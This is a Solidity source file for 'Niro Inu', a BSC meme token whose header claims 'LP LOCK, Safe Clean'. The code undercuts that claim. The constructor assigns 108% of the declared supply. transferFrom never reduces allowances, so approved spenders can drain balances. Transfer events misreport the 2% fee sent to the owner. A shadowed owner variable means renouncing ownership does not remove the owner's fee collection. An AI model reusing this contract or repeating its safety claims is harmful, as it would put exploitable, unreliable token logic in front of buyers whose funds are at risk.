/**
 *Submitted for verification at BscScan.com on 2022-03-21
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-25
*/

/*
ℛℴ𝒷ℯ𝓇𝓉 𝒟ℯ 𝒩𝒾𝓇ℴ 
𝕺𝖓𝖊 𝖔𝖋 𝖙𝖍𝖊 𝖌𝖗𝖊𝖆𝖙𝖊𝖘𝖙 𝖆𝖈𝖙𝖔𝖗𝖘 𝖔𝖋 𝖆𝖑𝖑 𝖙𝖎𝖒𝖊
𝓓𝓮𝓼𝓮𝓻𝓿𝓮 𝓱𝓲𝓼 𝓲𝓷𝓾 𝓽𝓸 𝓫𝓮 𝓴𝓷𝓸𝔀𝓷


███╗░░██╗██╗██████╗░░█████╗░  ██╗███╗░░██╗██╗░░░██╗
████╗░██║██║██╔══██╗██╔══██╗  ██║████╗░██║██║░░░██║
██╔██╗██║██║██████╔╝██║░░██║  ██║██╔██╗██║██║░░░██║
██║╚████║██║██╔══██╗██║░░██║  ██║██║╚████║██║░░░██║
██║░╚███║██║██║░░██║╚█████╔╝  ██║██║░╚███║╚██████╔╝
╚═╝░░╚══╝╚═╝╚═╝░░╚═╝░╚════╝░  ╚═╝╚═╝░░╚══╝░╚═════╝░

LP LOCK 
Safe Clean

"Yᴏᴜ ʟᴇᴀʀɴᴇᴅ ᴛʜᴇ ᴛᴡᴏ ɢʀᴇᴀᴛᴇsᴛ ᴛʜɪɴɢ ɪɴ ʟɪғᴇ, ɴᴇᴠᴇʀ ʀᴀᴛ ᴏɴ ʏᴏᴜʀ ғʀɪᴇɴᴅs, ᴀɴᴅ ᴀʟᴡᴀʏs ᴋᴇᴇᴘ ʏᴏᴜʀ ᴍᴏᴜᴛʜ sʜᴜᴛ.

Rᴏʙᴇʀᴛ Dᴇ Nɪʀᴏ"
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address ) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/26181
        return msg.data;
    }
}

interface MetaDAO {
  // @dev Returns the amount of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev LotteryDAO `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev LotteryDAO `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `value` tokens are moved from one account (`from`) to  another (`to`). Note that `value` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 value);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract LotteryDAO  is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Swap: caller is not the owner");
        _;
    }

 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Swap: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract NiroInu is MetaDAO, Context, LotteryDAO  {
  
    // common addresses
    address private _owner;
    address private CharityDAO;
    address private VaultDAO;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Niro Inu";
    string public override symbol = "Niro";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint value);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint value);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint totalSupplyValue, address CharityDAOAddress, address VaultDAOAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        _owner = msg.sender;
        CharityDAO = CharityDAOAddress;
        VaultDAO = VaultDAOAddress;
        
        // split the tokens according to agreed upon percentages
        balances[CharityDAO] =  totalSupply * 4 / 100;
        balances[VaultDAO] = totalSupply * 4 / 100;
        
        balances[_owner] = totalSupply * 100 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return _owner;
    }
    
    // Get the address of the token's LotteryDAO pot
    function getDeveloper() public view returns(address) {
        return CharityDAO;
    }
    
    // Get the address of the token's founder pot
    function getFounder() public view returns(address) {
        return VaultDAO;
    }
    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint value) public override returns(bool) {
        require(value > 0, "Transfer value has to be higher than 0.");
        require(balanceOf(msg.sender) >= value, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total value
        uint feesDAO = value * 2 / 100;
        uint burnDAO = value * 0 / 100;
        uint valueAfterTaxAndBurn = value - feesDAO - burnDAO;
        
        // perform the transfer operation
        balances[to] += valueAfterTaxAndBurn;
        balances[msg.sender] -= value;
        
        emit Transfer(msg.sender, to, value);
        
        // finally, we burn and tax the extras percentage
        balances[_owner] += feesDAO + burnDAO;
        _burn(_owner, burnDAO);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint value) public override returns(bool) {
        allowances[msg.sender][spender] = value; 
        
        emit Approval(msg.sender, spender, value);
        
        return true;
    }
    
    // allowance
    function allowance(address owner , address spender) public view  returns(uint) {
       return allowances[owner][spender];
 }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint value) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= value, "Allowance too low for transfer.");
        require(balances[from] >= value, "Balance is too low to make transfer.");
        
        balances[to] += value;
        balances[from] -= value;
        
        emit Transfer(from, to, value);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}